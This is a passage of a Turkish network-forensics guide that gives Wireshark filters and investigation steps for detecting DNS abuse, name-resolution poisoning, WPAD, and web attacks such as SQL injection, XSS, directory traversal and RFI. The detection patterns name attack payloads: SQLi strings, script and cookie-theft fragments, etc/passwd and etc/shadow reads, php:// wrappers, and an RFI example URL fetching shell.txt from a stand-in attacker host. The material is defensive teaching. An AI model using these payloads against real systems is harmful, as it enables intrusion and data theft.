3. Retransmission kopyalarını kaldır (uniq). Sıra önemli; sort kullanma, sırayı bozar.
4. Kodlamayı tanı: sadece 0-9a-f = hex; A-Z ve 2-7 = base32; büyük/küçük harf + rakam + / ve + = base64 (DNS'te genelde - ve _ ile değiştirilir).
5. Çöz ve file komutuyla çıktının türünü kontrol et (metin, zip, resim).

**Terimler:**

- **Exfiltration**: Verinin yetkisiz şekilde dışarı çıkarılması.
- **Base32**: DNS'e uygun, büyük harf + rakam kullanan kodlama.
- **file komutu**: Dosya türünü içeriğinden tanıyan Linux aracı.

> **Anlık karar:** Parçaları birleştirirken sırayı koru, tekrarları at. CTF'lerde flag genelde bu birleşimin sonunda çıkar.


</details>

<details>
<summary><strong>089 · Yeni ve nadir görülen alan adlarını ayıklamak</strong></summary>

**Metafor:** Bir mahallede herkesin tanıdığı yüzler arasında ilk kez görülen yabancı.

**Senden istenen:** "Bu trafikte olağan dışı alan adı hangisi?"

**Filtreler (araştırma yolu):**

- `dns.flags.response == 0 && dns.qry.name matches "\\.(top|xyz|club|online|site|icu|buzz|tk|ml|ga|cf|gq)$"` → istismar edilmeye yatkın ucuz TLD'ler
- `dns.flags.response == 0 && dns.qry.name matches "[0-9]{4,}"` → içinde uzun rakam dizisi geçen adlar

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'dns.flags.response == 0' -T fields -e dns.qry.name | sort | uniq -c | sort -n | head -30
```

**Filtreden sonra yol tarifi:**

1. Tüm sorguları sayıp en az sorgulananları en üste al (sort -n).
2. Bu listedeki alanları tek tek değerlendir: tanıdık mı, mantıklı mı, yazım hatası var mı?
3. Şüpheli olanları istihbarat kaynaklarında (VirusTotal, URLhaus) kontrol et (analiz makinesinden değil, güvenli bir ortamdan).
4. Kurumda ilk kez görülen alanları (proxy/DNS loglarıyla karşılaştırarak) önceliklendir.

**Terimler:**

- **Long tail**: Nadir görülen olayların oluşturduğu uzun kuyruk; tehdit avcılığının yeri.
- **Threat intelligence**: Bilinen zararlı göstergeler hakkındaki bilgi.

> **Anlık karar:** Saldırgan kalabalığa karışmak ister ama trafikte genelde tek başına kalır. Nadir olanı ara.


</details>

<details>
<summary><strong>090 · Typosquatting ve benzer alan adları</strong></summary>

**Metafor:** "Garanti" yerine "Garamti" yazan sahte tabela. Göz alışkanlıkla doğru okur, beyin kanar.

**Senden istenen:** "Kullanıcı sahte (benzer) bir alana mı yönlendirildi?"

**Filtreler (araştırma yolu):**

- `dns.qry.name matches "micros0ft|g00gle|paypa1|faceb00k|arnazon|rnicrosoft"` → klasik harf/rakam taklitleri
- `dns.qry.name contains "xn--"` → punycode (uluslararası karakterli) alanlar; homograf saldırısı adayı
- `dns.qry.name matches "(login|secure|verify|account|update).*\\.(com|net)"` → oltalama kelimeleri içeren alanlar

**Filtreden sonra yol tarifi:**

1. Kurumun ve popüler servislerin adlarına benzeyen alanları ara (o→0, l→1, m→rn).
2. xn-- ile başlayan punycode alanlarını çöz; Kiril "а" ile Latin "a" gibi görünüşte aynı harfler olabilir.
3. Kullanıcının bu alana sonrasında ne gönderdiğine bak (HTTP POST ile parola, Problem 210).
4. E-posta trafiği varsa bu linkin hangi e-postayla geldiğini bul (Problem 205).

**Terimler:**

- **Typosquatting**: Yazım hatasına benzeyen alan adı kaydedip kullanıcıları kandırma.
- **Punycode**: Türkçe/Kiril gibi özel karakterli alan adlarının ASCII gösterimi (xn--).
- **Homograph**: Görünüşte aynı, aslında farklı karakter.

> **Anlık karar:** Gözle değil, karakter karakter oku. Rapora alan adını kopyala-yapıştır yaz, elle yazma.


</details>

<details>
<summary><strong>091 · Dinamik DNS (DDNS) servislerinin kullanımı</strong></summary>

**Metafor:** Sabit adresi olmayan birinin her gün yerini değiştirip bir "yönlendirme hattı" kullanması.

**Senden istenen:** "Zararlı altyapısı DDNS üzerinde mi?"

**Filtreler (araştırma yolu):**

- `dns.qry.name matches "(duckdns\\.org|no-ip\\.(com|org|biz)|ddns\\.net|hopto\\.org|zapto\\.org|dynu\\.(com|net)|myftp\\.(org|biz)|serveo\\.net|ngrok\\.io|ngrok-free\\.app)$"` → yaygın DDNS ve tünel servisleri
- `tls.handshake.extensions_server_name contains "ngrok"` → ngrok tüneline TLS bağlantısı

**Filtreden sonra yol tarifi:**

1. DDNS alanlarını filtrele ve sorgulayan makineleri listele.
2. Kurumsal ağda bu servislere meşru ihtiyaç çok azdır; her birini incele.
3. Çözülen IP'yi ve sonrasında yapılan bağlantıyı bul.
4. ngrok/serveo gibi tüneller saldırganın kendi makinesini internete açması için kullanılır; özellikle önemlidir.

**Terimler:**

- **DDNS**: IP'si sık değişen cihazlara sabit alan adı veren servis.
- **ngrok**: Yerel bir servisi internete açan tünel servisi; saldırganlar C2 için kötüye kullanır.

> **Anlık karar:** DDNS + yeni dosya indirme veya şifreli uzun bağlantı = yüksek öncelik.


</details>

<details>
<summary><strong>092 · DNS amplification saldırısı (ANY sorguları)</strong></summary>

**Metafor:** Küçük bir zarfla büyük bir koliyi başkasının adresine sipariş etmek.

**Senden istenen:** "Ağımız amplifikasyonda yansıtıcı olarak mı kullanıldı, yoksa hedef mi?"

**Filtreler (araştırma yolu):**

- `dns.qry.type == 255` → ANY sorguları
- `dns.flags.response == 1 && frame.len > 1000` → büyük DNS cevapları
- `dns.rr.udp_payload_size >= 4096` → EDNS ile büyük cevap kabul ettiğini ilan eden sorgular

**Filtreden sonra yol tarifi:**

1. ANY sorgularını filtrele, sorguyu "kimin adına" yapıldığına (kaynak IP) bak.
2. Sorgu boyutu ile cevap boyutunu karşılaştır; 50 katı geçen büyüme amplifikasyondur.
3. Kendi DNS sunucun dış IP'lere büyük cevaplar gönderiyorsa yansıtıcı olarak kullanılıyorsun (açık resolver).
4. Gelen cevapları istemeyen bir hosta büyük DNS cevapları yağıyorsa hedefsin.

**Terimler:**

- **Open resolver**: Herkese DNS cevabı veren yanlış yapılandırılmış sunucu.
- **EDNS**: DNS'in daha büyük paketlere izin veren uzantısı.
- **ANY (type 255)**: Bir alana ait tüm kayıtları isteme sorgusu.

> **Anlık karar:** "Bu cevapları kim istedi?" sorusunu sor. İstek görmüyorsan (sadece cevap) sen hedefsin.


</details>

<details>
<summary><strong>093 · Cevapsız kalan DNS sorguları</strong></summary>

**Metafor:** Telefon açılmıyor; ya karşıda kimse yok ya hat kesik.

**Senden istenen:** "DNS sunucusu çalışıyor mu?", "Sorgular engelleniyor mu?"

**Filtreler (araştırma yolu):**

- `dns.flags.response == 0 && !dns.response_in` → cevabı hiç gelmemiş sorgular
- `dns.time > 1` → cevabı 1 saniyeden uzun süren sorgular
- `dns.retransmission` → tekrarlanmış sorgular

**Filtreden sonra yol tarifi:**

1. Cevapsız sorguları filtrele; Wireshark cevabı bulduğunda "Response In" alanını ekler, yoksa eklemez.
2. Hepsi aynı sunucuya mı gidiyor? O sunucu erişilemez veya engellenmiştir.
3. Hepsi aynı alana mı? Sinkhole edilmiş veya firewall'da engellenmiş zararlı alan olabilir.
4. Yavaş cevapları (dns.time) performans analizinde kullan.

**Terimler:**

- **Sinkhole**: Zararlı alanı kontrollü bir sunucuya yönlendirme veya düşürme.
- **dns.response_in**: Wireshark'ın sorgu ile cevabı eşleştirdiği yardımcı alan.

> **Anlık karar:** Zararlı alan sorgusu cevapsızsa bu "saldırı başarısız" demek değildir; zararlı başka kanal deneyebilir. Sonrasını izle.


</details>

<details>
<summary><strong>094 · mDNS, LLMNR ve NBNS ile isim çözümleme izleri</strong></summary>

**Metafor:** Rehberde bulamayınca koridora çıkıp "Ahmet burada mı?" diye bağırmak. Herkes duyar, kötü niyetli biri "Benim!" diyebilir.

**Senden istenen:** "Yerel isim çözümleme trafiği ne söylüyor?", "Zehirleme (poisoning) var mı?"

**Filtreler (araştırma yolu):**

- `llmnr` → LLMNR (UDP 5355)
- `nbns` → NetBIOS Name Service (UDP 137)
- `mdns` → Multicast DNS (UDP 5353)
- `llmnr && dns.flags.response == 1` → LLMNR cevapları (kim "benim" dedi?)
- `nbns.flags.response == 1` → NBNS cevapları

**Filtreden sonra yol tarifi:**

1. Bu protokoller DNS başarısız olduğunda devreye girer. Yazım hatalı paylaşım adları (\\fileservr gibi) en sık sebeptir.
2. Cevapları filtrele. Var olmayan bir isme cevap veren makine varsa ve cevap hep aynı IP'den geliyorsa zehirleme vardır (Problem 169).
3. Ardından o IP'ye SMB/HTTP bağlantısı ve NTLM kimlik doğrulaması geliyorsa hash çalınmıştır.
4. Sorgulanan isimleri listele; iç ağ hakkında bilgi verir.

**Terimler:**

- **LLMNR**: Windows'un yerel ağda DNS'siz isim çözme protokolü.
- **Poisoning**: Sahte cevap vererek trafiği kendine çekme.

> **Anlık karar:** LLMNR/NBNS sorusu normaldir, CEVABI şüphelidir. Var olmayan isme kim cevap veriyor?


</details>

<details>
<summary><strong>095 · PTR (ters DNS) sorguları ile iç keşif</strong></summary>

**Metafor:** Elinde sadece telefon numaraları olan birinin, her numarayı rehberde tersten arayıp sahibini bulması.

**Senden istenen:** "Saldırgan iç ağ isimlerini ters DNS ile mi topladı?"

**Filtreler (araştırma yolu):**

- `dns.qry.type == 12` → PTR sorguları
- `dns.qry.type == 12 && ip.src == 10.0.0.5` → tek kaynağın PTR sorguları
- `dns.qry.name contains "in-addr.arpa"` → IPv4 ters sorgular

**Filtreden sonra yol tarifi:**

1. PTR sorgularını filtrele ve kaynağa göre say.
2. Ardışık IP'ler için ters sorgu (1.0.0.10.in-addr.arpa, 2.0.0.10...) = ters DNS taraması (nmap varsayılan olarak yapar).
3. Cevaplarda dönen host adlarını listele; saldırganın öğrendiği isimler bunlar.
4. Tarama zamanını zaman çizelgesine ekle.

**Terimler:**

- **PTR kaydı**: IP'den isme ters çözümleme kaydı.
- **in-addr.arpa**: Ters DNS için kullanılan özel alan (IP tersten yazılır).

> **Anlık karar:** Port taramasıyla aynı anda başlayan PTR yağmuru büyük ihtimalle nmap'tir (-n kullanılmamış).


</details>

<details>
<summary><strong>096 · DNS TTL değeri çok düşük alanlar</strong></summary>

**Metafor:** Kartvizitinde "bu numara 1 dakika geçerli" yazan biri; sürekli yeni numara verir.

**Senden istenen:** "Hangi alanlar sürekli değişen altyapı kullanıyor?"

**Filtreler (araştırma yolu):**

- `dns.resp.ttl < 60 && dns.a` → 1 dakikadan kısa TTL'li A kayıtları
- `dns.resp.ttl == 0` → önbelleğe alınmayacak cevaplar

**Filtreden sonra yol tarifi:**

1. Düşük TTL'li cevapları filtrele ve alan adlarını listele.
2. CDN ve büyük bulut servislerini (akamai, cloudfront, azure) ayıkla; bunlar meşru olarak düşük TTL kullanır.
3. Kalanlarda aynı alan için farklı IP'ler dönüyor mu bak (Problem 081).
4. Düşük TTL tünel araçlarında da görülür (her sorgunun gerçekten sunucuya ulaşması için).

**Terimler:**

- **TTL (DNS)**: Cevabın önbellekte kalma süresi.
- **CDN**: İçeriği dünyaya dağıtan sunucu ağı.

> **Anlık karar:** Düşük TTL tek başına zararlı demek değildir. Düşük TTL + bilinmeyen alan + değişen IP birlikte anlamlıdır.


</details>

<details>
<summary><strong>097 · Bir alan adını hangi makinelerin sorguladığı (etki genişliği)</strong></summary>

**Metafor:** Bir zehirli ürün bulunduğunda "bu ürünü kimler satın aldı?" listesini çıkarmak.

**Senden istenen:** "Zararlı alana kaç ve hangi makine gitti? Olay kaç makineyi etkiliyor?"

**Filtreler (araştırma yolu):**

- `dns.qry.name contains "kotu-alan.com" && dns.flags.response == 0` → alanı soran tüm makineler
- `ip.dst == 203.0.113.50 && tcp.flags.syn == 1 && tcp.flags.ack == 0` → zararlı IP'ye bağlanmaya çalışan tüm makineler

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'dns.qry.name contains "kotu-alan.com" && dns.flags.response == 0' -T fields -e ip.src | sort | uniq -c
```

**Filtreden sonra yol tarifi:**

1. Zararlı alanı soran kaynak IP'leri listele.
2. Dikkat: Kurumsal ağda istemciler DNS'i iç DNS sunucusuna sorar; pcap DNS sunucusu ile dış dünya arasında alındıysa sadece DNS sunucusunu görürsün. Kaydın nereden alındığını bil.
3. DNS'e ek olarak zararlı IP'ye doğrudan bağlanan makineleri de bul.
4. Etkilenen makine listesini olay müdahale ekibine ilet; her biri izolasyon adayıdır.

**Terimler:**

- **Scope (kapsam)**: Olaydan etkilenen sistemlerin tamamı.
- **Containment**: Yayılmayı durdurma (izolasyon).

> **Anlık karar:** Kaydın alındığı nokta (sensör yeri) gördüğün kaynak IP'yi belirler. İç DNS'in arkasını göremiyorsan DNS sunucusu loglarını iste.


</details>

<details>
<summary><strong>098 · DNS sorgu ID ve transaction eşleştirme</strong></summary>

**Metafor:** Kargo takip numarası. Hangi paketin hangi siparişe ait olduğunu numaradan anlarsın.

**Senden istenen:** "Bu cevap hangi soruya ait?", "Cevap süresi ne kadar?", "Sorgu ID'leri tahmin edilebilir mi?"

**Filtreler (araştırma yolu):**

- `dns.id == 0x1a2b` → belirli işlem numarasının sorgu ve cevabı
- `dns.flags.response == 1 && dns.time > 0.5` → yarım saniyeden yavaş cevaplar
- `dns.response_to` → cevabın hangi sorgu paketine ait olduğunu gösteren alan

**Filtreden sonra yol tarifi:**

1. Sorgu paketinde Transaction ID'yi oku, aynı ID'li cevabı filtrele.
2. Wireshark eşleşmeyi otomatik yapar: sorguda "Response In: N", cevapta "Request In: M" ve "Time: x saniye" yazar.
3. Sıralı/tahmin edilebilir ID'ler eski veya zayıf DNS istemcisine işaret eder (spoofing'e açık).
4. Spoofing incelemesinde aynı ID'ye birden fazla cevap gelip gelmediğine bak (Problem 082).

**Terimler:**

- **Transaction ID**: DNS sorgusu ile cevabını eşleştiren 16 bitlik sayı.
- **Latency**: Gecikme süresi.

> **Anlık karar:** dns.time sütunu, DNS kaynaklı yavaşlık şikayetlerinde tek bakışta cevap verir.


</details>

<details>
<summary><strong>099 · DNS üzerinden saldırgan altyapısını (IOC) çıkarmak</strong></summary>

**Metafor:** Bir suçlunun telefon rehberini ele geçirip tüm bağlantılarını çıkarmak.

**Senden istenen:** "Bu olaya ait tüm alan adlarını ve IP'leri listele."

**Filtreler (araştırma yolu):**

- `dns.flags.response == 1 && dns.a && ip.dst == 10.0.0.20` → kurbana dönen tüm çözümlemeler
- `dns.flags.response == 1 && (dns.qry.name contains "kotu" || dns.a == 203.0.113.0/24)` → bilinen kötü alan veya IP bloğu

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'dns.flags.response == 1 && dns.a' -T fields -e frame.time_utc -e dns.qry.name -e dns.a
```

**Filtreden sonra yol tarifi:**

1. Tüm başarılı çözümlemeleri "zaman - alan - IP" tablosu olarak çıkar.
2. Bilinen zararlı alanla aynı IP'yi paylaşan diğer alanları bul (aynı sunucuda başka zararlı alanlar olabilir).
3. Aynı IP bloğuna (ör. /24) çözülen alanları grupla.
4. Sonuçları IOC listesine ekle (Problem 194).

**Terimler:**

- **IOC**: Indicator of Compromise; ele geçirilme göstergesi (IP, alan, hash, URL).
- **Pivot**: Bir göstergeden yola çıkıp bağlantılı başka göstergeler bulma.

> **Anlık karar:** Bir IOC bulduğunda dur ve pivot yap: aynı IP'ye çözülen başka alan var mı? Aynı alanı soran başka makine var mı?


</details>

<details>
<summary><strong>100 · WPAD ve ISATAP sorguları ile proxy zehirleme</strong></summary>

**Metafor:** Bir otel misafirinin "otelin resmi rehberi nerede?" diye sorması ve sahte birinin kendi rehberini vermesi. Tüm şehir turu artık sahte rehberle yapılır.

**Senden istenen:** "Kurbanın tüm web trafiği saldırganın proxy'sine mi yönlendirildi?"

**Filtreler (araştırma yolu):**

- `dns.qry.name contains "wpad" || nbns.name contains "WPAD"` → WPAD arama sorguları (dns.qry.name alanı LLMNR ve mDNS sorgularını da kapsar)
- `http.request.uri contains "wpad.dat"` → proxy yapılandırma dosyası isteği
- `http.request.uri contains "proxy.pac"` → alternatif PAC dosyası adı
- `http.proxy_authorization` → proxy'ye gönderilen kimlik bilgileri

**Filtreden sonra yol tarifi:**

1. WPAD sorgularını bul ve kimin cevap verdiğine bak (DNS, LLMNR, NBNS).
2. Cevap veren IP'den wpad.dat indirildiyse dosyanın içeriğini Follow Stream ile oku; "PROXY 10.0.0.66:3128" gibi bir satır saldırganın proxy'sidir.
3. Sonrasında kurbanın HTTP isteklerinin bu proxy'ye gidip gitmediğine bak.
4. Proxy, NTLM kimlik doğrulaması istemişse (407 Proxy Authentication Required) kullanıcının hash'i çalınmıştır (Problem 155).

**Terimler:**

- **WPAD**: Web Proxy Auto-Discovery; tarayıcının proxy ayarını otomatik bulma özelliği.
- **PAC dosyası**: Hangi isteğin hangi proxy'den geçeceğini söyleyen JavaScript dosyası.
- **407**: Proxy kimlik doğrulaması isteyen HTTP kodu.

> **Anlık karar:** WPAD cevabını iç ağdaki sıradan bir iş istasyonu veriyorsa saldırı. Responder ve mitm6 bu tekniği kullanır.


</details>

## E · HTTP ve Web Saldırıları

*HTTP açık kartpostaldır: istek, parametre, cevap, dosya, hepsi okunur. Web saldırılarında soruların çoğu "ne denendi, ne başarılı oldu, ne çalındı/yüklendi" üçlüsüdür.*

<details>
<summary><strong>101 · HTTP isteklerini listelemek: kim neyi istedi?</strong></summary>

**Metafor:** Bir dükkânın sipariş defterini okumak: kim geldi, ne istedi, ne aldı.

**Senden istenen:** "Kurban hangi URL'lere gitti?", "Saldırgan hangi sayfaları istedi?"

**Filtreler (araştırma yolu):**

- `http.request` → tüm HTTP istekleri
- `http.request.method == "GET"` → sadece GET (sayfa/dosya isteme)
- `http.request.method == "POST"` → sadece POST (veri gönderme: form, dosya yükleme, giriş)
- `http.response` → tüm cevaplar

**Menü / araç:**

- Statistics ▸ HTTP ▸ Requests → host ve URI bazında ağaç görünüm
- Statistics ▸ HTTP ▸ Packet Counter → metot ve cevap kodu sayıları

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'http.request' -T fields -e frame.time_utc -e ip.src -e http.request.method -e http.host -e http.request.uri
```

**Filtreden sonra yol tarifi:**

1. http.request filtresini uygula ve http.host + http.request.uri sütunlarını ekle.
2. Statistics ▸ HTTP ▸ Requests ile tüm siteleri ve yolları ağaç halinde gör.
3. tshark ile "zaman - kaynak - metot - host - URI" tablosu çıkar; bu web zaman çizelgendir.
4. Garip yolları (/shell.php, /../../, /admin, uzun parametreler) işaretle.
5. İsteğe sağ tıklayıp Follow ▸ HTTP Stream ile istek ve cevabı birlikte oku.

**Terimler:**

- **HTTP**: Web'in şifresiz iletişim protokolü.
- **URI**: İstenen kaynağın yolu (/index.php?id=5).
- **GET / POST**: Bir şey isteme / bir şey gönderme metotları.

> **Anlık karar:** Web vakalarında ilk 10 dakika sadece URI listesini oku. Saldırının hikâyesi URI'lerde yazar.


</details>

<details>
<summary><strong>102 · Web dizin/dosya taraması (gobuster, dirb, ffuf) tespiti</strong></summary>

**Metafor:** Bir binada her odanın kapısını sırayla deneyen biri; çoğu kilitli (404), birkaçı açık (200).

**Senden istenen:** "Dizin taraması yapılmış mı, hangi dizinler bulunmuş?"

**Filtreler (araştırma yolu):**

- `http.response.code == 404` → "bulunamadı" cevapları
- `http.response.code == 404 && ip.dst == 10.0.0.5` → saldırgana dönen 404'ler
- `http.response.code in {200, 301, 302, 403} && ip.dst == 10.0.0.5` → saldırganın bulduğu (var olan) yollar
- `http.user_agent matches "gobuster|dirbuster|dirb|ffuf|feroxbuster|wfuzz"` → tarama aracı imzaları

**Filtreden sonra yol tarifi:**

1. 404'leri filtrele; kısa sürede yüzlerce 404 = dizin taraması.
2. Kaynak IP ve User-Agent'ı not et (ör. "gobuster/3.1.0").
3. 200/301/403 dönen istekleri listele; bunlar saldırganın keşfettiği gerçek yollardır. 403 bile "burada bir şey var" demektir.
4. Saldırganın sonradan hangi keşfedilmiş yola tekrar döndüğüne bak (ör. /admin veya /uploads); asıl saldırı oradan gelir.

**Terimler:**

- **404**: Bulunamadı. 200 = Başarılı. 301/302 = Yönlendirme. 403 = Yasak (ama var).
- **Wordlist**: Tarama araçlarının denediği kelime listesi.

> **Anlık karar:** 404 yağmurunun içindeki 200'ler hazinedir. Filtreyi 404'ten 200'e çevir, keşfi gör.


</details>

<details>
<summary><strong>103 · Zafiyet tarayıcı izleri (Nikto, sqlmap, Nmap NSE, WPScan) ve User-Agent</strong></summary>

**Metafor:** Hırsızın üzerinde "Hırsız" yazan tişörtle gelmesi. Otomatik araçlar çoğu zaman kendini açıkça tanıtır.

**Senden istenen:** "Hangi saldırı aracı kullanılmış?"

**Filtreler (araştırma yolu):**

- `http.user_agent matches "nikto|sqlmap|nmap|wpscan|acunetix|nessus|openvas|burp|zgrab|masscan|nuclei|whatweb"` → bilinen tarayıcılar
- `http.request.uri matches "nikto|\\.\\./|etc/passwd|<script"` → istek yolunda tarayıcı izleri
- `http.user_agent == "" || !http.user_agent` → User-Agent'sız istekler (betikler)

**Filtreden sonra yol tarifi:**

1. User-Agent sütunu ekle, Statistics ▸ HTTP ▸ Requests yerine User-Agent'a göre grupla (tshark ile sort | uniq -c).
2. Bilinen araç imzalarını ara. Nikto UA'sında "Nikto", sqlmap'te "sqlmap/1.x" yazar.
3. Araç UA'sını gizlemiş olabilir; o zaman istek hızına (saniyede onlarca) ve istek çeşitliliğine bak.
4. Aracı tespit ettiğinde saldırganın amacını da bilirsin: sqlmap = SQLi, wpscan = WordPress, nikto = genel zafiyet.

**Terimler:**

- **User-Agent**: İstemcinin kendini tanıttığı HTTP başlığı; kolayca değiştirilebilir.
- **Scanner**: Zafiyetleri otomatik arayan araç.

> **Anlık karar:** UA'ya güven ama doğrula: UA "Mozilla" diyor ama saniyede 50 istek atıyorsa tarayıcı insan değildir.


</details>

<details>
<summary><strong>104 · SQL Injection denemeleri</strong></summary>

**Metafor:** Bir dilekçe formuna "Adım Ali; ayrıca tüm müşteri listesini bana verin" yazmak ve memurun bunu da yerine getirmesi.

**Senden istenen:** "SQLi denemesi var mı, hangi parametreye, hangi payload ile?"

**Filtreler (araştırma yolu):**

- `http.request.uri matches "(union.*select|select.*from|or\\+1=1|or%201=1|'--|%27|sleep\\(|benchmark\\(|information_schema)"` → URL'de SQLi kalıpları
- `urlencoded-form.value matches "(union|select|' or|sleep\\()"` → POST form değerlerinde SQLi
- `http.request.uri contains "%27"` → URL kodlu tek tırnak (')
- `http.response.code == 500` → sunucu hataları (SQLi denemesi sıklıkla 500 döndürür)

**Filtreden sonra yol tarifi:**

1. URI filtreleriyle denemeleri bul; Wireshark URI'yi kodlu (%27, %20) gösterir. Paket detayında "Request URI Query Parameter" satırları çözülmüş halini gösterir.
2. Saldırının hedeflediği parametreyi belirle (?id=, ?user= gibi).
3. Payload türünü sınıflandır: hata tabanlı (' ile hata alma), UNION tabanlı (veri çekme), boolean/zaman tabanlı kör (sleep, AND 1=1).
4. Sunucu cevaplarına bak: hata mesajında "SQL syntax", "mysql_fetch" gibi ifadeler varsa uygulama zafiyetli.
5. Başarı analizi için Problem 105'e geç.

**Terimler:**

- **SQL Injection**: Kullanıcı girdisine SQL kodu ekleyip veritabanını manipüle etme.
- **URL encoding**: Özel karakterlerin %XX ile yazılması (%27 = ', %20 = boşluk).
- **Blind SQLi**: Cevapta veri göremeyip doğru/yanlış veya zaman farkıyla bilgi çıkarma.

> **Anlık karar:** Wireshark'ta URI kodlu durur. Gözünle bakarken paket detayındaki çözülmüş parametreleri oku veya CyberChef "URL Decode" kullan.


</details>

<details>
<summary><strong>105 · Başarılı SQLi'yi başarısızdan ayırmak</strong></summary>

**Metafor:** Kasayı zorlayan hırsızın her denemesinde kasanın sesi aynı mı? Bir denemede ses farklıysa (kapak açıldıysa) iş bitmiştir.

**Senden istenen:** "SQLi başarılı oldu mu, hangi veri çekildi?"

**Filtreler (araştırma yolu):**

- `http.response.code == 200 && http.content_length > 5000` → normalden büyük başarılı cevaplar
- `http.file_data contains "password" || http.file_data contains "admin"` → cevap gövdesinde hassas kelime
- `http.file_data matches "[a-f0-9]{32}"` → cevapta MD5 hash benzeri değerler (kullanıcı parola hash'leri)
- `http.time > 5` → 5 saniyeden geç gelen cevaplar (zaman tabanlı kör SQLi'nin başarısı)

**Filtreden sonra yol tarifi:**

1. Aynı parametreye yapılan isteklerin cevap boyutlarını karşılaştır (http.content_length sütunu). Farklı boyut = farklı sonuç.
2. UNION SELECT denemesinden sonraki cevapta tablo/sütun adları, kullanıcı adları veya hash'ler görünüyorsa veri çekilmiştir.
3. Zaman tabanlı denemede sleep(5) gönderilen isteğin cevabı 5 saniye gecikiyorsa enjeksiyon çalışıyor demektir; http.time sütununa bak.
4. sqlmap kullanıldıysa istek sırası mantıklı ilerler: veritabanı adı → tablolar → sütunlar → dump. Son isteklerdeki cevaplar çalınan veridir.
5. Çalınan veriyi Follow HTTP Stream ile oku ve kanıt olarak kaydet.

**Terimler:**

- **http.file_data**: HTTP gövdesi (Wireshark sıkıştırmayı açmış haliyle).
- **http.time**: İstek ile cevap arasındaki süre.
- **Dump**: Veritabanı içeriğinin dışarı aktarılması.

> **Anlık karar:** Başarının imzası cevaptadır, istekte değil. Her zaman "sunucu ne döndürdü?" diye bak.


</details>

<details>
<summary><strong>106 · XSS (Cross-Site Scripting) denemeleri</strong></summary>

**Metafor:** Ziyaretçi defterine not yerine, defteri okuyan herkesin cebinden cüzdanını alan bir büyü yazmak.

**Senden istenen:** "XSS denemesi var mı, hangi payload, kalıcı mı?"

**Filtreler (araştırma yolu):**

- `http.request.uri matches "(<script|%3Cscript|javascript:|onerror=|onload=|alert\\(|document\\.cookie)"` → URL'de XSS kalıpları
- `urlencoded-form.value matches "(<script|onerror|onload|javascript:)"` → form verisinde XSS
- `http.file_data contains "<script>alert"` → cevap içinde yansımış payload (başarılı yansıma)

**Filtreden sonra yol tarifi:**

1. İsteklerde script etiketlerini ve olay işleyicilerini (onerror, onload) ara.
2. Cevapta aynı payload kodlanmadan (escape edilmeden) dönüyorsa XSS çalışıyor demektir.
3. Payload'da document.cookie ve dış bir URL varsa çerez çalma amaçlıdır; o URL'ye giden istekleri ara (Problem 114).
4. POST ile kaydedilen (yorum, profil) payload kalıcı (stored) XSS'tir; diğer kullanıcıların o sayfayı açtığı istekleri bul.

**Terimler:**

- **XSS**: Web sayfasına başka kullanıcıların tarayıcısında çalışacak kod enjekte etme.
- **Reflected / Stored XSS**: Yansıyan (anlık) / Kalıcı (kayıtlı) XSS.
- **Escape**: Özel karakterlerin zararsız hale getirilmesi (< yerine &lt;).

> **Anlık karar:** XSS'te kurban sunucu değil, sayfayı açan kullanıcıdır. Payload'dan sonra "kim bu sayfayı açtı?" diye ara.


</details>

<details>
<summary><strong>107 · Directory traversal ve LFI (yerel dosya okuma)</strong></summary>

**Metafor:** Kütüphaneden kitap isterken "üç raf geri git, müdürün çekmecesindeki dosyayı getir" demek.

**Senden istenen:** "Sunucudan hangi dosya okunmaya çalışıldı, okundu mu?"

**Filtreler (araştırma yolu):**

- `http.request.uri contains "../" || http.request.uri contains "..%2f" || http.request.uri contains "%2e%2e"` → üst dizine çıkma kalıpları
- `http.request.uri matches "(etc/passwd|etc/shadow|win\\.ini|boot\\.ini|windows/system32)"` → klasik hedef dosyalar
- `http.request.uri matches "(php://filter|php://input|file://|expect://)"` → PHP wrapper istismarı
- `http.file_data contains "root:x:0:0"` → cevapta /etc/passwd içeriği (başarı kanıtı)

**Filtreden sonra yol tarifi:**

1. Traversal kalıplarını filtrele, hedeflenen dosyaları listele.
2. Hangi parametrenin kullanıldığını bul (?page=, ?file=, ?lang=).
3. Cevapta dosya içeriği var mı bak: "root:x:0:0" (/etc/passwd), "[fonts]" (win.ini). Varsa başarılıdır.
4. php://filter/convert.base64-encode ile okunan dosyalar cevapta base64 döner; çözüp kaynak kodu oku.
5. Okunan dosyalarda (config.php gibi) parola varsa saldırganın sonraki girişini ara.

**Terimler:**

- **Directory traversal**: ../ ile izin verilen dizinin dışına çıkma.
- **LFI**: Local File Inclusion; sunucudaki yerel dosyayı uygulamaya dahil ettirme.
- **PHP wrapper**: php:// gibi özel akış tanımlayıcıları.

> **Anlık karar:** "root:x:0:0" cevabı görürsen başarı kesindir. Bu tek satır bütün tartışmayı bitirir.


</details>

<details>
<summary><strong>108 · Remote File Inclusion (RFI)</strong></summary>

**Metafor:** Kütüphaneye "şu dış adresteki kitabı al, yüksek sesle oku ve dediklerini yap" demek.

**Senden istenen:** "Sunucu dış bir zararlı betiği çekip çalıştırdı mı?"

**Filtreler (araştırma yolu):**

- `http.request.uri matches "=(https?|ftp)(://|%3A%2F%2F)"` → parametre değeri olarak dış URL
- `http.request.uri matches "\\.(txt|php|jpg)\\?" && http.request.uri contains "http"` → shell.txt? gibi klasik RFI kalıbı
- `ip.src == 10.0.0.80 && http.request` → web sunucusunun kendisinin dışarıya yaptığı istekler

**Filtreden sonra yol tarifi:**

1. Parametre değeri olarak URL içeren istekleri bul (?page=http://saldirgan.com/shell.txt).
2. Hemen ardından web sunucusunun o URL'ye kendisi istek attı mı bak; sunucu kaynaklı dış istek = RFI çalıştı.
3. Sunucunun indirdiği dosyayı Export Objects ▸ HTTP ile kaydet ve incele.
4. Sonrasında komut çalıştırma veya reverse shell bağlantısı ara (Problem 111, 179).

**Terimler:**

- **RFI**: Uygulamanın uzak bir dosyayı dahil edip çalıştırması.
- **Sunucu kaynaklı istek**: Web sunucusunun istemci gibi davranıp dışarı bağlanması; normalde nadirdir.

> **Anlık karar:** Web sunucusu dışarı istek atmaya başladıysa (yeni SYN'ler) olay istemci tarafından sunucu tarafına geçmiştir.


</details>

<details>
<summary><strong>109 · Komut enjeksiyonu (Command Injection)</strong></summary>

**Metafor:** Bir kargo formunda adres yerine "Adres: X; ayrıca depodaki tüm paketleri bana gönder" yazmak ve sistemin bunu bir komut olarak işlemesi.

